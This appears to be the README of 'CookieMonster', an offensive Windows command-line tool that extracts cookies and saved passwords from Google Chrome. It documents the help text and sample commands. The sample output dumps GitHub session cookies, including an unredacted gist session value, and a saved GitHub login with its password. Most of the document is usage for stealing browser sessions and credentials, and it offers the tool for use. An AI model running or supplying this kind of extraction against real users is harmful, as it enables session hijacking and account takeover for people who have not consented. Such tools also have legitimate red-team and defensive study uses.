# CookieMonster

CookieMonster is tool for extracting cookie and credential data from browsers (currently only Google Chrome).

## Usage
### Help
```
> CookieMonster.exe help
CookieMonster 0.0.0.1

  cookies    Extract browser cookies.

  creds      Extract browser saved credentials.

  help       Display more information on a specific command.

  version    Display version information.
```

```
> CookieMonster.exe help cookies
CookieMonster 0.0.0.1

  -b, --browser    (Default: Chrome) Browser to target.  Example: -b Chrome

  -d, --domain     (Default: .) Domain(s) to extract cookies for. Enter multiple domains using [space] as a separator.  Example: -d domain1.com domain2.com.

  -e, --enc        Set to true to extract encrypted cookie values.  Example: -e.

  -n, --name       Extract particular cookie name(s)/key(s).  Enter multiple names using [space] as a separator.  Example: -n OhpAuth ESTSAUTH.

  -a, --all        Dump ALL cookies at your peril.

  --help           Display this help screen.

  --version        Display version information.
```

```
> CookieMonster.exe help creds
CookieMonster 0.0.0.1

  -b, --browser    (Default: Chrome) Browser to target.

  --help           Display this help screen.

  --version        Display version information.
```

### Cookies
#### Dump all encrypted cookies for a given domain
```
> CookieMonster.exe cookies -d github.com -e
{"path":"/","domain":".github.com","name":"_octo","value":"GH1.1.1060151975.1547832564","expirationdate":13255378163000000}
{"path":"/","domain":".github.com","name":"dotcom_user","value":"rasta-mouse","expirationdate":13823473098358549}
{"path":"/","domain":".github.com","name":"logged_in","value":"yes","expirationdate":13823473098358523}
{"path":"/","domain":".rawgithub.com","name":"__cfduid","value":"de9ba72962ddc97e594b365619034544b1548515384","expirationdate":13224524985654102}
{"path":"/","domain":".help.github.com","name":"__utma","value":"168287928.1016859727.1548786775.1548786775.1548786775.1","expirationdate":13256332375000000}
{"path":"/","domain":".help.github.com","name":"__utmz","value":"168287928.1548786775.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)","expirationdate":13209028375000000}
{"path":"/","domain":".github.com","name":"_ga","value":"GA1.2.1626619431.1548786778","expirationdate":13256332378000000}
{"path":"/","domain":"gist.github.com","name":"__Host-gist_user_session_same_site","value":"R2UIVTZtfzyx6ZCpNyjh5y_rRRFAUVVx62W_wpFggKPZ7D_m","expirationdate":13195602704208500}
{"path":"/","domain":"gist.github.com","name":"gist_user_session","value":"R2UIVTZtfzyx6ZCpNyjh5y_rRRFAUVVx62W_wpFggKPZ7D_m","expirationdate":13195602704208456}
{"path":"/","domain":"github.com","name":"__Host-user_session_same_site","value":"[...redact...]","expirationdate":13195685162019013}
{"path":"/","domain":"github.com","name":"_gh_sess","value":"[...redact...]","expirationdate":0}
{"path":"/","domain":"github.com","name":"has_recent_activity","value":"1","expirationdate":13194479162019037}
{"path":"/","domain":"github.com","name":"tz","value":"Europe%2FLondon","expirationdate":0}
{"path":"/","domain":"github.com","name":"user_session","value":"[...redact...]","expirationdate":13195685162018974}
```

#### Dump specific encrypted cookies for a given domain
```
> CookieMonster.exe cookies -d github.com -n logged_in dotcom_user user_session _gh_sess -e
{"path":"/","domain":".github.com","name":"logged_in","value":"yes","expirationdate":13823473098358523}
{"path":"/","domain":".github.com","name":"dotcom_user","value":"rasta-mouse","expirationdate":13823473098358549}
{"path":"/","domain":"github.com","name":"user_session","value":"[...redact...]","expirationdate":13195685162018974}
{"path":"/","domain":"github.com","name":"_gh_sess","value":"[...redact...]","expirationdate":0}
```

### Credentials
```
> CookieMonster.exe creds
https://github.com/login :: rasta-mouse :: S3cur3Passw0rd!
```